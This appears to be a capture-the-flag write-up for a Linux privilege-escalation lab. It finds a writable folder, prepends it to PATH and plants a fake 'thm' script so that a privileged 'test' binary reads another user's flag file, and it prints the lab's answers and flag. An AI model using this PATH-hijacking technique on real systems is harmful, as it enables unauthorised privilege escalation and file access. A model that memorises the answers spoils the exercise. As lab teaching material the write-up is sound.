## In Linux, the PATH environment variable defines where the system looks for executables. If a writable folder is included in PATH, an attacker can hijack an application to execute a malicious script.

### Q.1: What is the odd folder you have write access for?

Let’s move on. We are getting quite close now!
To see the folders for which we have write access we can run the following command:

```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
We see a lot of results, but the one that stands out to me is **/home/murdoch**.

### Answer: /home/murdoch

### Q.2: Exploit the $PATH vulnerability to read the content of the flag6.txt file.

Now, to find a vulnerability, let’s have a look at the **/home/murdoch/** folder. In it we find a **test** executable, and a python script **thm.py**, which both try to call an executable called thm.

We know that we have access to the /home/murdoch/ folder, and this folder should now be added to the PATH. Do so by running this command:
```export PATH=/home/murdoch:$PATH```

Now check the path: ```echo $PATH```

These would show this: 
```/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin```

Now we need to find the path of **flag6.txt**. To find the flag we've to run this command: ```find / -name flag6.txt 2>/dev/null```.
The flag is located at: **/home/matt/flag6.txt**

To read the content of the txt file, we could create a simple cat command to this location: ```echo 'cat /home/matt/flag6.txt' > thm```

Now we have three file at **/home/murdoch/**. These script will make us to read the content of the flag6.txt.

Now, save the file, and try to run the **test** or **thm.py** file. This will fail with a permission denied message. This is because we need to give it executable rights: ```chmod +x thm```

We could run the **test** file at the **/home/murdoch** by running this: ```./test```
This would give the flag 

### Q.3: What is the content of the flag6.txt file?

To read the content of the flag6.txt, run this command: ```./test```
### Answer: THM-736628929
